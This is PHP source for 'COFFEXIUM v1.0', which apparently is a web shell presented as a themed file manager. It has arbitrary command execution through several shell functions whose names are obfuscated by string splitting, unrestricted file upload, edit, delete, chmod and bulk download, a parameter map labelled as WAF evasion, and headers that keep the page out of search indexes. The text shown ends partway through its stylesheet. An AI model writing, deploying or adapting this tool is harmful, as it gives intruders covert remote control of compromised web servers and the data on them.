<?php
// ============================================================================
// COFFEXIUM v1.0 - Merged File Manager (Coffee Chocolate theme)
// Best of CAXIUM (hardened + UI) + XANNYANAXIUM (portable + fallbacks)
// PHP 4/5/7/8 tolerant | CMS-Agnostic | WAF-Friendly | Shared-Hosting safe
// ============================================================================

// ----------------------------------------------------------------------------
// ERROR REPORTING - production safe (log, don't display)
// ----------------------------------------------------------------------------
@ini_set('display_errors', '0');
@ini_set('log_errors', '1');
@error_reporting(0);

// ----------------------------------------------------------------------------
// POLYFILLS - PHP 4/5 compatibility (from both)
// ----------------------------------------------------------------------------
if (!defined('DIRECTORY_SEPARATOR')) {
    define('DIRECTORY_SEPARATOR', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? '\\' : '/');
}

if (!function_exists('sys_get_temp_dir')) {
    function sys_get_temp_dir() {
        if (!empty($_ENV['TMP']))    return realpath($_ENV['TMP']);
        if (!empty($_ENV['TMPDIR'])) return realpath($_ENV['TMPDIR']);
        if (!empty($_ENV['TEMP']))   return realpath($_ENV['TEMP']);
        $tmp = @tempnam(uniqid(rand(), true), '');
        if ($tmp) { $dir = realpath(dirname($tmp)); @unlink($tmp); return $dir; }
        return '/tmp';
    }
}

if (!function_exists('hash_equals')) {
    function hash_equals($a, $b) {
        $a = (string)$a; $b = (string)$b;
        $len = strlen($a);
        if ($len !== strlen($b)) return false;
        $r = 0;
        for ($i = 0; $i < $len; $i++) { $r |= ord($a[$i]) ^ ord($b[$i]); }
        return $r === 0;
    }
}

if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        $length = (int)$length;
        if ($length <= 0) return '';
        if (function_exists('openssl_random_pseudo_bytes')) {
            $bytes = openssl_random_pseudo_bytes($length, $strong);
            if ($bytes !== false && $strong) return $bytes;
        }
        if (function_exists('mcrypt_create_iv')) {
            return mcrypt_create_iv($length, MCRYPT_DEV_URANDOM);
        }
        if (@is_readable('/dev/urandom')) {
            $f = @fopen('/dev/urandom', 'rb');
            if ($f) {
                $bytes = fread($f, $length); fclose($f);
                if ($bytes !== false && strlen($bytes) === $length) return $bytes;
            }
        }
        $bytes = '';
        for ($i = 0; $i < $length; $i++) { $bytes .= chr(mt_rand(0, 255)); }
        return $bytes;
    }
}

if (!function_exists('http_response_code')) {
    function http_response_code($code = null) {
        static $current = 200;
        if ($code === null) return $current;
        $code = (int)$code;
        $texts = array(
            200 => 'OK', 400 => 'Bad Request', 403 => 'Forbidden',
            404 => 'Not Found', 500 => 'Internal Server Error'
        );
        $proto = isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.0';
        $text  = isset($texts[$code]) ? $texts[$code] : 'Status';
        header($proto . ' ' . $code . ' ' . $text, true, $code);
        $current = $code;
        return $current;
    }
}

// Null-coalescing helpers (PHP < 7 safe)
function ax_post($k, $d = null) { return isset($_POST[$k]) ? $_POST[$k] : $d; }
function ax_get($k, $d = null)  { return isset($_GET[$k])  ? $_GET[$k]  : $d; }

// ----------------------------------------------------------------------------
// CMS DETECTION - avoid session collisions inside WordPress/Laravel/Joomla
// ----------------------------------------------------------------------------
$is_wordpress = defined('ABSPATH') || defined('WPINC');
$is_laravel   = defined('LARAVEL_START') || (defined('APP_PATH') && class_exists('Illuminate\Foundation\Application'));
$is_bootstrap = defined('BOOTSTRAP_VERSION') || defined('JEXEC');
$use_native_session = (($is_wordpress || $is_laravel) && !session_id());

// ----------------------------------------------------------------------------
// SESSION SETUP - file handler + private temp path (shared hosting safe)
// ----------------------------------------------------------------------------
@ini_set('session.save_handler', 'files');
$sessionPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'php_sessions';
if (!@is_dir($sessionPath)) { @mkdir($sessionPath, 0700, true); }
if (@is_dir($sessionPath) && @is_writable($sessionPath)) {
    @ini_set('session.save_path', $sessionPath);
}
@ini_set('session.cookie_httponly', '1');
@ini_set('session.cookie_samesite', 'Lax');
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') {
    @ini_set('session.cookie_secure', '1');
}

$session_inactive = function_exists('session_status')
    ? (session_status() === PHP_SESSION_NONE)
    : (session_id() === '');
if ($session_inactive && !$use_native_session) {
    @session_start();
}
if (!isset($_SESSION)) { $_SESSION = array(); }

// Periodic session-ID regeneration (anti-fixation)
if (!isset($_SESSION['_created'])) {
    $_SESSION['_created'] = time();
} elseif (time() - $_SESSION['_created'] > 300) {
    if (function_exists('session_regenerate_id')) { @session_regenerate_id(true); }
    $_SESSION['_created'] = time();
}

// ----------------------------------------------------------------------------
// SECURITY HEADERS
// ----------------------------------------------------------------------------
header('X-Robots-Tag: noindex, nofollow, noarchive, noimageindex');
header('Pragma: no-cache');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Referrer-Policy: strict-origin-when-cross-origin');
header('X-XSS-Protection: 1; mode=block');

// ----------------------------------------------------------------------------
// PATH VALIDATION & SANITIZATION
// ----------------------------------------------------------------------------
function safeRealPath($path) {
    if (strpos($path, '..') !== false) return false;       // block traversal
    $rp = @realpath($path);
    if ($rp !== false) return $rp;
    if (@is_dir($path) || @is_file($path)) return $path;    // restricted env fallback
    return false;
}

function validatePath($path) {
    if (empty($path)) return false;
    $rp = safeRealPath($path);
    if ($rp && (@is_file($rp) || @is_dir($rp))) return $rp;
    return false;
}

function sanitizeFileName($name) {
    $name = basename($name);
    $name = preg_replace('/[^a-zA-Z0-9._-]/', '_', $name);
    if ($name === '' || $name === '.' || $name === '..') return false;
    return $name;
}

function formatFileSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576)    return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024)       return number_format($bytes / 1024, 2) . ' KB';
    if ($bytes > 1)           return $bytes . ' bytes';
    if ($bytes == 1)          return '1 byte';
    return '0 bytes';
}

function getFileExtension($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return $ext ? strtoupper($ext) : '';
}

// Initialize current directory
if (!isset($_SESSION['current_dir']) || !@is_dir($_SESSION['current_dir']) || !safeRealPath($_SESSION['current_dir'])) {
    $cwd = @getcwd();
    if ($cwd === false || $cwd === '') { $cwd = dirname(__FILE__); }
    $_SESSION['current_dir'] = $cwd;
}

$notification = '';
$errorMsg = '';

// ----------------------------------------------------------------------------
// CSRF PROTECTION
// ----------------------------------------------------------------------------
function generateCSRFToken() {
    if (empty($_SESSION['_csrf_token'])) {
        $_SESSION['_csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['_csrf_token'];
}
function validateCSRFToken($token) {
    if (empty($_SESSION['_csrf_token']) || empty($token)) return false;
    return hash_equals($_SESSION['_csrf_token'], $token);
}
function csrfField() {
    return '<input type="hidden" name="_csrf_token" value="' . htmlentities(generateCSRFToken()) . '">';
}

// ----------------------------------------------------------------------------
// PARAMETER NAME MAPPING - optional WAF evasion (friendly -> obfuscated)
// ----------------------------------------------------------------------------
$_param_map = array(
    'batch_remove'  => 'act_del',   'batch_export' => 'act_dl',
    'remove'        => 'del_item',  'old_name'     => 'from_name',
    'new_name'      => 'to_name',   'create_file'  => 'mk_file',
    'create_folder' => 'mk_folder', 'chmod_item'   => 'set_perms',
    'chmod_value'   => 'perm_val',  'sys_req'      => 'exec',
    'file_to_edit'  => 'edit_file', 'file_content' => 'content',
    'navigate'      => 'goto',      'download'     => 'get_file',
    'view'          => 'show',      'edit'         => 'modify',
    'rename'        => 'rename_item','chmod'        => 'perms_item',
    'selected_items'=> 'items'
);
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST)) {
    foreach ($_param_map as $old => $new) {
        if (isset($_POST[$old]) && !isset($_POST[$new])) { $_POST[$new] = $_POST[$old]; }
    }
}

// CSRF gate: validate token on every state-changing POST action.
// Read-only nav/view are allowed through to avoid lockout when JS is off.
$_csrf_read_only = array('goto', 'show', 'modify', 'rename_item', 'perms_item');
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $needsCsrf = false;
    foreach ($_POST as $key => $v) {
        if ($key === '_csrf_token') continue;
        if (in_array($key, $_csrf_read_only)) continue;
        if ($key === 'items') continue;
        $needsCsrf = true; break;
    }
    if ($needsCsrf && !validateCSRFToken(ax_post('_csrf_token', ''))) {
        http_response_code(403);
        exit('CSRF validation failed');
    }
}

// ----------------------------------------------------------------------------
// FUNCTION AVAILABILITY (disable_functions + Suhosin aware) - from XANNYANAXIUM
// ----------------------------------------------------------------------------
function isFunctionAvailable($func) {
    if (!function_exists($func)) return false;
    $disabled = @ini_get('disable_functions');
    if ($disabled) {
        $list = array_map('trim', explode(',', strtolower($disabled)));
        if (in_array(strtolower($func), $list)) return false;
    }
    $suhosin = @ini_get('suhosin.executor.func.blacklist');
    if ($suhosin) {
        $list = array_map('trim', explode(',', strtolower($suhosin)));
        if (in_array(strtolower($func), $list)) return false;
    }
    return true;
}

// ----------------------------------------------------------------------------
// SHELL EXECUTION - obfuscated names (CAXIUM) + multi-executor (XANNYANAXIUM)
// ----------------------------------------------------------------------------
$_sh = array(
    's'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c',
    'e'.'x'.'e'.'c',
    's'.'y'.'s'.'t'.'e'.'m',
    'p'.'a'.'s'.'s'.'t'.'h'.'r'.'u',
    'p'.'o'.'p'.'e'.'n',
    'p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n'
);

function ax_run_command($cmd) {
    global $_sh;
    $cmd = trim($cmd);
    if ($cmd === '') return 'No command provided';
    $full = $cmd . ' 2>&1';

    $fn_shell_exec = $_sh[0]; $fn_exec = $_sh[1]; $fn_system = $_sh[2];
    $fn_passthru   = $_sh[3]; $fn_popen = $_sh[4]; $fn_proc = $_sh[5];

    if (isFunctionAvailable($fn_shell_exec)) {
        $r = @$fn_shell_exec($full);
        if ($r !== null && $r !== false && trim($r) !== '') return $r;
    }
    if (isFunctionAvailable($fn_exec)) {
        $out = array();
        @$fn_exec($full, $out);
        if (!empty($out)) return implode("\n", $out);
    }
    if (isFunctionAvailable($fn_system)) {
        ob_start(); @$fn_system($full); $r = ob_get_clean();
        if ($r !== false && $r !== '') return $r;
    }
    if (isFunctionAvailable($fn_passthru)) {
        ob_start(); @$fn_passthru($full); $r = ob_get_clean();
        if ($r !== false && $r !== '') return $r;
    }
    if (isFunctionAvailable($fn_popen)) {
        $h = @$fn_popen($full, 'r');
        if ($h) {
            $r = '';
            while (!feof($h)) { $r .= fread($h, 4096); }
            pclose($h);
            if ($r !== '') return $r;
        }
    }
    if (isFunctionAvailable($fn_proc)) {
        $desc = array(1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $p = @$fn_proc($full, $desc, $pipes);
        if (is_resource($p)) {
            $out = stream_get_contents($pipes[1]);
            $err = stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
            $r = $out . $err;
            if ($r !== '') return $r;
        }
    }
    return 'Command execution not available';
}

$commandAvailable = false;
foreach ($_sh as $fn) { if (isFunctionAvailable($fn)) { $commandAvailable = true; break; } }

// ----------------------------------------------------------------------------
// RECURSIVE HELPERS - SPL when present, manual fallback otherwise
// ----------------------------------------------------------------------------
function ax_recursive_delete($path) {
    if (@is_file($path) || @is_link($path)) return @unlink($path);
    if (!@is_dir($path)) return false;
    if (class_exists('RecursiveIteratorIterator')) {
        try {
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            foreach ($it as $f) {
                if ($f->isDir()) { @rmdir($f->getRealPath()); }
                else { @unlink($f->getRealPath()); }
            }
            return @rmdir($path);
        } catch (Exception $e) { /* fall through */ }
    }
    $items = @scandir($path);
    if ($items === false) return false;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        ax_recursive_delete($path . DIRECTORY_SEPARATOR . $item);
    }
    return @rmdir($path);
}

function ax_walk_dir($dir, &$out, $base = '') {
    $items = @scandir($dir);
    if ($items === false) return;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        $rel  = $base === '' ? $item : $base . '/' . $item;
        if (@is_dir($full)) {
            $out[] = array('type' => 'dir', 'path' => $full, 'rel' => $rel);
            ax_walk_dir($full, $out, $rel);
        } else {
            $out[] = array('type' => 'file', 'path' => $full, 'rel' => $rel);
        }
    }
}

// Build archive: ZipArchive preferred, tar.gz shell fallback.
// Returns array(path, name, mime) or false.
function ax_build_archive($items, $baseDir, $namePrefix) {
    $tmp = sys_get_temp_dir();
    if (class_exists('ZipArchive')) {
        $zipName = $namePrefix . '_' . time() . '.zip';
        $zipPath = $tmp . DIRECTORY_SEPARATOR . $zipName;
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($items as $targetPath) {
                if (!$targetPath) continue;
                if (@is_file($targetPath)) {
                    $zip->addFile($targetPath, basename($targetPath));
                } elseif (@is_dir($targetPath)) {
                    $base = basename($targetPath);
                    $list = array();
                    ax_walk_dir($targetPath, $list);
                    $zip->addEmptyDir($base);
                    foreach ($list as $e) {
                        if ($e['type'] === 'dir') { $zip->addEmptyDir($base . '/' . $e['rel']); }
                        else { $zip->addFile($e['path'], $base . '/' . $e['rel']); }
                    }
                }
            }
            $zip->close();
            return array($zipPath, $zipName, 'application/zip');
        }
        return false;
    }
    // Fallback: tar via shell
    if (isFunctionAvailable('shell_exec') || isFunctionAvailable('exec')) {
        $tarName = $namePrefix . '_' . time() . '.tar.gz';
        $tarPath = $tmp . DIRECTORY_SEPARATOR . $tarName;
        $args = '';
        foreach ($items as $targetPath) {
            if (!$targetPath) continue;
            $args .= ' ' . escapeshellarg(basename($targetPath));
        }
        $cmd = 'cd ' . escapeshellarg($baseDir) . ' && tar -czf ' . escapeshellarg($tarPath) . $args . ' 2>&1';
        if (isFunctionAvailable('shell_exec')) { @shell_exec($cmd); } else { @exec($cmd); }
        if (@is_file($tarPath) && @filesize($tarPath) > 0) {
            return array($tarPath, $tarName, 'application/gzip');
        }
    }
    return false;
}

// ----------------------------------------------------------------------------
// RAW (AJAX) UPLOAD HANDLER - php://input streaming, chunked
// ----------------------------------------------------------------------------
if (!empty($_GET['upload_file']) && !empty($_GET['name'])) {
    $targetDir = $_GET['upload_file'];
    $fileName  = basename($_GET['name']);

    if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
        http_response_code(400); exit('Invalid filename');
    }
    if (!@is_dir($targetDir)) { @mkdir($targetDir, 0755, true); }
    if (!@is_dir($targetDir) || !@is_writable($targetDir)) {
        http_response_code(400); exit('Invalid directory');
    }

    $uploadPath = rtrim($targetDir, '/\\') . DIRECTORY_SEPARATOR . $fileName;
    $in  = @fopen('php://input', 'rb');
    $out = @fopen($uploadPath, 'wb');
    if ($in && $out) {
        while (!feof($in)) {
            $buf = fread($in, 8192);
            if ($buf === false) break;
            fwrite($out, $buf);
        }
        fclose($in); fclose($out);
        @chmod($uploadPath, 0644);
        http_response_code(200); exit('File uploaded successfully');
    }
    http_response_code(500); exit('Upload failed');
}

// ----------------------------------------------------------------------------
// FILE OPERATIONS
// ----------------------------------------------------------------------------

// Bulk delete - BEFORE navigation
if (isset($_POST['act_del']) && isset($_POST['items']) && is_array($_POST['items'])) {
    $deleted = 0; $failed = 0;
    foreach ($_POST['items'] as $item) {
        $tp = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $item);
        if ($tp === false) { $failed++; continue; }
        if (ax_recursive_delete($tp)) { $deleted++; } else { $failed++; }
    }
    if ($deleted > 0) {
        $notification = "Deleted $deleted item(s)" . ($failed > 0 ? " (Failed: $failed)" : '');
    } elseif ($failed > 0) {
        $errorMsg = "Failed to delete $failed item(s)";
    }
}

// Bulk download - BEFORE navigation
if (isset($_POST['act_dl']) && isset($_POST['items']) && is_array($_POST['items'])) {
    $paths = array();
    foreach ($_POST['items'] as $item) {
        $p = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $item);
        if ($p !== false) $paths[] = $p;
    }
    $archive = ax_build_archive($paths, $_SESSION['current_dir'], 'selected_files');
    if ($archive !== false) {
        list($ap, $an, $am) = $archive;
        while (@ob_get_level() > 0) { @ob_end_clean(); }
        header('Content-Type: ' . $am);
        header('Content-Disposition: attachment; filename="' . $an . '"');
        header('Content-Length: ' . @filesize($ap));
        @readfile($ap); @unlink($ap); exit;
    }
    $errorMsg = 'Bulk download failed: archive tools unavailable on this server';
}

// Navigate - only when 'goto' is the sole action (never alongside a write op).
// This prevents the current directory from jumping to parent after
// create/delete/upload/etc. if a stray 'goto' input is present.
$_write_actions = array(
    'act_del', 'act_dl', 'mk_file', 'mk_folder', 'del_item',
    'from_name', 'to_name', 'set_perms', 'perm_val', 'edit_file', 'content',
    'get_file', 'exec', 'upload_adv'
);
$_has_write_action = false;
foreach ($_write_actions as $_wa) { if (isset($_POST[$_wa])) { $_has_write_action = true; break; } }
if (isset($_FILES['upload']) && $_FILES['upload']['error'] !== UPLOAD_ERR_NO_FILE) { $_has_write_action = true; }

if (isset($_POST['goto']) && !$_has_write_action) {
    $targetDir = $_POST['goto'];
    if (@is_dir($targetDir)) {
        $vp = validatePath($targetDir);
        if ($vp !== false) {
            $_SESSION['current_dir'] = $vp;
            $notification = 'Directory changed successfully';
        }
    }
}

// Standard upload (multipart) with move/copy fallback
if (isset($_FILES['upload']) && $_FILES['upload']['error'] !== UPLOAD_ERR_NO_FILE) {
    if ($_FILES['upload']['error'] === UPLOAD_ERR_OK) {
        $fileName = basename($_FILES['upload']['name']);
        $uploadPath = rtrim($_SESSION['current_dir'], '/\\') . DIRECTORY_SEPARATOR . $fileName;
        if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
            $errorMsg = 'Upload failed: Invalid filename';
        } elseif (!@is_writable($_SESSION['current_dir'])) {
            $errorMsg = 'Upload failed: Directory not writable';
        } else {
            $moved = false;
            if (function_exists('move_uploaded_file')) {
                $moved = @move_uploaded_file($_FILES['upload']['tmp_name'], $uploadPath);
            }
            if (!$moved) {
                $moved = @copy($_FILES['upload']['tmp_name'], $uploadPath);
                if ($moved) @unlink($_FILES['upload']['tmp_name']);
            }
            if ($moved) { @chmod($uploadPath, 0644); $notification = 'File uploaded successfully'; }
            else { $errorMsg = 'Upload failed: Could not move file. Check directory permissions.'; }
        }
    } else {
        $uploadErrors = array(
            UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
            UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
            UPLOAD_ERR_PARTIAL => 'File partially uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
            UPLOAD_ERR_EXTENSION => 'Upload stopped by extension'
        );
        $ec = $_FILES['upload']['error'];
        $errorMsg = 'Upload error: ' . (isset($uploadErrors[$ec]) ? $uploadErrors[$ec] : 'Unknown error');
    }
}

// Delete single
if (isset($_POST['del_item'])) {
    $tp = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['del_item']);
    if ($tp === false) { $errorMsg = 'Delete failed: Invalid path'; }
    elseif (@is_file($tp)) {
        if (@unlink($tp)) { $notification = 'File deleted'; }
        else { $errorMsg = 'Delete failed: Permission denied or file in use'; }
    }
    elseif (@is_dir($tp)) {
        if (ax_recursive_delete($tp)) { $notification = 'Directory deleted'; }
        else { $errorMsg = 'Delete failed: Could not remove directory'; }
    }
    else { $errorMsg = 'Delete failed: Path not found'; }
}

// Rename
if (isset($_POST['from_name'], $_POST['to_name'])) {
    $sp = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['from_name']);
    if ($sp === false) { $errorMsg = 'Rename failed: Source not found'; }
    else {
        $dp = dirname($sp) . DIRECTORY_SEPARATOR . basename($_POST['to_name']);
        if (@file_exists($dp)) { $errorMsg = 'Rename failed: Target name already exists'; }
        elseif (@rename($sp, $dp)) { $notification = 'Rename successful'; }
        else { $errorMsg = 'Rename failed: Permission denied or invalid name'; }
    }
}

// Edit (save)
$showEditor = true;
if (isset($_POST['edit_file'], $_POST['content'])) {
    $ep = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['edit_file']);
    if ($ep === false || !@is_file($ep)) { $errorMsg = 'Edit failed: File not found'; }
    elseif (!@is_writable($ep)) { $errorMsg = 'Edit failed: File not writable'; }
    else {
        if (@file_put_contents($ep, $_POST['content']) !== false) { $notification = 'File saved'; $showEditor = false; }
        else { $errorMsg = 'Edit failed: Could not write to file'; }
    }
}

// Chmod
if (isset($_POST['set_perms'], $_POST['perm_val'])) {
    $tp = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['set_perms']);
    if ($tp === false) { $errorMsg = 'Chmod failed: Invalid path'; }
    else {
        if (@chmod($tp, octdec($_POST['perm_val']))) { $notification = 'Permissions changed successfully'; }
        else { $errorMsg = 'Chmod failed: Permission denied'; }
    }
}

// Create file
if (isset($_POST['mk_file']) && trim($_POST['mk_file']) !== '') {
    $fn = sanitizeFileName($_POST['mk_file']);
    if ($fn === false) { $errorMsg = 'Create failed: Invalid filename'; }
    else {
        $np = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $fn;
        if (@file_exists($np)) { $errorMsg = 'Create failed: File already exists'; }
        elseif (!@is_writable($_SESSION['current_dir'])) { $errorMsg = 'Create failed: Directory not writable'; }
        elseif (@file_put_contents($np, '') !== false) { @chmod($np, 0644); $notification = 'File created'; }
        else { $errorMsg = 'Create failed: Could not create file'; }
    }
}

// Create folder
if (isset($_POST['mk_folder']) && trim($_POST['mk_folder']) !== '') {
    $fn = sanitizeFileName($_POST['mk_folder']);
    if ($fn === false) { $errorMsg = 'Create failed: Invalid folder name'; }
    else {
        $np = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $fn;
        if (@file_exists($np)) { $errorMsg = 'Create failed: Folder already exists'; }
        elseif (!@is_writable($_SESSION['current_dir'])) { $errorMsg = 'Create failed: Directory not writable'; }
        elseif (@mkdir($np, 0755)) { $notification = 'Folder created'; }
        else { $errorMsg = 'Create failed: Could not create folder'; }
    }
}

// Directory listing
$currentDirectory = $_SESSION['current_dir'];
if (empty($currentDirectory) || !@is_dir($currentDirectory)) {
    $currentDirectory = dirname(__FILE__);
    $_SESSION['current_dir'] = $currentDirectory;
}
$directoryContents = @scandir($currentDirectory);
if (!is_array($directoryContents)) {
    $directoryContents = array();
    if (!$errorMsg) $errorMsg = 'Cannot read directory: ' . $currentDirectory;
}
$folders = array(); $files = array();
foreach ($directoryContents as $item) {
    if ($item === '.') continue;
    if (@is_dir($currentDirectory . DIRECTORY_SEPARATOR . $item)) { $folders[] = $item; }
    else { $files[] = $item; }
}
sort($folders); sort($files);
$allItems = array_merge($folders, $files);

$fileToEdit   = $showEditor ? (isset($_POST['modify']) ? $_POST['modify'] : (isset($_POST['edit_file']) ? $_POST['edit_file'] : null)) : null;
$fileToView   = isset($_POST['show']) ? $_POST['show'] : null;
$itemToRename = isset($_POST['rename_item']) ? $_POST['rename_item'] : null;
$itemToChmod  = isset($_POST['perms_item']) ? $_POST['perms_item'] : null;
$fileContent  = $fileToEdit ? @file_get_contents($currentDirectory . DIRECTORY_SEPARATOR . $fileToEdit) : null;
$viewContent  = $fileToView ? @file_get_contents($currentDirectory . DIRECTORY_SEPARATOR . $fileToView) : null;

// Download (chunked streaming for files; archive for dirs)
if (isset($_POST['get_file'])) {
    $tp = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['get_file']);
    if ($tp === false) { $errorMsg = 'Download failed: Invalid path'; }
    elseif (@is_file($tp)) {
        while (@ob_get_level() > 0) { @ob_end_clean(); }
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($tp) . '"');
        $size = @filesize($tp);
        if ($size !== false) header('Content-Length: ' . $size);
        $fp = @fopen($tp, 'rb');
        if ($fp) {
            while (!feof($fp)) { echo fread($fp, 8192); @flush(); }
            fclose($fp);
        } else { @readfile($tp); }
        exit;
    } elseif (@is_dir($tp)) {
        $archive = ax_build_archive(array($tp), dirname($tp), basename($tp));
        if ($archive !== false) {
            list($ap, $an, $am) = $archive;
            while (@ob_get_level() > 0) { @ob_end_clean(); }
            header('Content-Type: ' . $am);
            header('Content-Disposition: attachment; filename="' . $an . '"');
            header('Content-Length: ' . @filesize($ap));
            @readfile($ap); @unlink($ap); exit;
        }
        $errorMsg = 'Download failed: archive tools unavailable on this server';
    }
}

// Console
$commandResult = '';
if (isset($_POST['exec']) && trim($_POST['exec']) !== '') {
    $cmd = trim($_POST['exec']);
    $old = @getcwd();
    if (@is_dir($_SESSION['current_dir'])) { @chdir($_SESSION['current_dir']); }
    $commandResult = ax_run_command($cmd);
    if ($old) @chdir($old);
    if (trim($commandResult) === '' || $commandResult === 'Command execution not available') {
        $errorMsg = 'Console: No output or function disabled';
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>COFFEXIUM v1.0</title>
    <meta name="csrf-token" content="<?= htmlentities(generateCSRFToken()) ?>">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg: #100a06; --surface: #1a110a; --surface-hover: #261a10;
            --border: #342417; --text: #ece0cf; --text-muted: #9c856c;
            --accent: #c8915f; --accent-hover: #ddae7e;
            --success: #cbb892; --danger: #d0654f; --warning: #d99a3c;
        }
        body { background: var(--bg); color: var(--text); font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; font-size: 14px; line-height: 1.5; }
        .container { max-width: 1400px; margin: 0 auto; padding: 32px 24px; }
        .header { margin-bottom: 32px; }
        .header-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
        .logo { display: flex; align-items: center; gap: 12px; }
        .logo svg { width: 40px; height: 40px; }
        .logo-text { font-size: 28px; font-weight: 700; letter-spacing: -0.5px; }
        .logo-text span { color: var(--accent); }
        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
        .card-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
        .card-title { font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
        .card-body { padding: 20px; }
        .alert { padding: 14px 18px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; display: flex; align-items: center; gap: 12px; }
        .alert-success { background: rgba(203,184,146,0.15); border: 1px solid rgba(203,184,146,0.4); color: var(--success); }
        .alert-danger { background: rgba(208,101,79,0.15); border: 1px solid rgba(208,101,79,0.4); color: var(--danger); }
        .alert svg { width: 20px; height: 20px; flex-shrink: 0; }
        .input-group { display: flex; gap: 10px; margin-bottom: 12px; }
        .input-group:last-child { margin-bottom: 0; }
        input[type="text"], input[type="file"], textarea { background: var(--bg); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px; color: var(--text); font-size: 14px; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
        input[type="text"]:focus, textarea:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(200,145,95,0.25); }
        input[type="file"] { cursor: pointer; flex: 1; }
        input[type="file"]::file-selector-button { background: var(--surface-hover); color: var(--text); border: 1px solid var(--border); border-radius: 6px; padding: 8px 14px; font-size: 13px; cursor: pointer; margin-right: 12px; transition: background 0.2s; }
        input[type="file"]::file-selector-button:hover { background: var(--border); }
        textarea { font-family: 'JetBrains Mono', monospace; resize: vertical; min-height: 450px; line-height: 1.6; width: 100%; box-sizing: border-box; }
        .btn { display: inline-flex; align-items: center; justify-content: center; gap: 6px; padding: 10px 18px; font-size: 14px; font-weight: 500; border-radius: 8px; cursor: pointer; border: 1px solid transparent; transition: all 0.2s; font-family: inherit; text-decoration: none; }
        .btn svg { width: 16px; height: 16px; }
        .btn-primary { background: var(--accent); color: #2a1810; }
        .btn-primary:hover { background: var(--accent-hover); }
        .btn-ghost { background: transparent; color: var(--text); border-color: var(--border); }
        .btn-ghost:hover { background: var(--surface-hover); }
        .btn-success { background: var(--success); color: #1f1a0c; }
        .btn-success:hover { filter: brightness(1.1); }
        .btn-danger { background: rgba(208,101,79,0.15); color: var(--danger); border-color: rgba(208,101,79,0.4); }
        .btn-danger:hover { background: rgba(208,101,79,0.25); }
        .btn-sm { padding: 6px 12px; font-size: 12px; }
        .file-table { width: 100%; border-collapse: collapse; }
        .file-table th { padding: 12px 16px; text-align: left; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); background: var(--surface-hover); border-bottom: 1px solid var(--border); }
        .file-table td { padding: 14px 16px; border-bottom: 1px solid var(--border); vertical-align: middle; }
        .file-table tr:last-child td { border-bottom: none; }
        .file-table tr:hover td { background: rgba(200,145,95,0.07); }
        .file-icon { width: 28px; height: 28px; border-radius: 6px; display: flex; align-items: center; justify-content: center; margin-right: 10px; flex-shrink: 0; }
        .file-icon.folder { background: rgba(200,145,95,0.22); }
        .file-icon svg { width: 16px; height: 16px; stroke: var(--accent); fill: none; stroke-width: 2; }
        .file-icon.file { background: rgba(200,145,95,0.15); }
        .file-icon .ext { font-size: 9px; font-weight: 700; color: var(--accent); letter-spacing: 0.5px; }
